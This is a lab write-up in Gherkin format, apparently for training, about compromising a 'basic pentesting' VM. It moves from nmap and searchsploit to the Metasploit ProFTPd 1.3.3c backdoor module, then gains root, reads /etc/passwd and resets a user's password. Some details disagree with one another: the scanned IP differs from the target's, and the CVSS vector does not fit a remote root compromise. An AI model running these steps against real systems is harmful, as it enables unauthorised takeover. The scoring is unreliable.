## Version 1.4.1
## language: en

Feature:
  TOE:
    basic pentesting
  Location:
    192.168.0.25:80
  CWE:
    CWE-250: Execution with Unnecessary Privileges
  Rule:
    REQ.154 Eliminate Back Doors
  Goal:
    Access to the ubuntu desktop with the user "marlinspike"
  Recommendation:
    ProFTPd version 1.3.3c should be updated to a more recent version

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.20esr    |
    | Nmap            | 7.80        |
    | Metasploit      | v5.0.79-dev |
  TOE information:
    Given I'm accessing the server 192.168.0.25
    And FTP is open on port 21
    And is running on Ubuntu 2.6.24

  Scenario: Normal use case
  The server has an access to FTP
    Given I'm scanning the server
    """
    $ nmap -p- -sV 192.168.0.31 --open
    """
    When I can see which ports are open
    """
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     ProFTPD 1.3.3c
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    """
    Then I decide to enter port 80 to see the website

  Scenario: Static detection
  No code given

  Scenario: Dynamic detection
  Remote connection with FTP
    Given I found a port FTP
    When I decide to go in
    """
    $ ftp 192.168.0.25
    """
    Then I enter "root" as a user and leave the password empty
    And it didn't work
    When I decide to run a command to see if there's an exploit
    """
    $ searchsploit ProFTPD
    """
    Then I see you have a very interesting exploit
    """
    ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)
    """

  Scenario: Exploitation
  Remote connection with FTP
    Given I found a exploit
    When I decide to look for information on the Internet
    Then I see that the version of ProFTPd-1.3.3c has a vulnerability
    And the cybercriminals uploaded a backdoor to the source code of ProFTPd
    When the time people download that version, they're already at risk
    Then I also see that the "Backdoor" gives access as "root"
    When I decide to run Metasploit
    Then I use this exploit
    """
    msf5 > use exploit/unix/ftp/proftpd_133c_backdoor
    """
    And I just have to set up the victim's IP
    """
    msf5 > set RHOSTS 192.168.0.25
    """
    When I decide to run the exploit
    Then I see that I already have access to the server
    And I run a command to see what permissions I have
    """
    # id
    """
    When I realize I'm "root"
    Then I decide to go on this route
    """
    # cat /etc/passwd
    """
    And I see there's the user "marlinspike"
    When I decide to just change the password of the user "marlinspike"
    """
    passwd marlinspike
    """
    Then with that change I already entered the Ubuntu desk and the SSH
    And I have access to everything

  Scenario: Remediation
  No code given

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    6.8/10 (medium) - AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
  Temporal: Attributes that measure the exploit's popularity and fixability
    6.1/10 (medium) - E:X/RL:O/RC:X
  Environmental: Unique and relevant attributes to a specific user environment
    6.1/10 (medium) - MAV:A/MAC:L/MPR:L/MUI:N/MS:U/MC:N/MI:L/MA:L
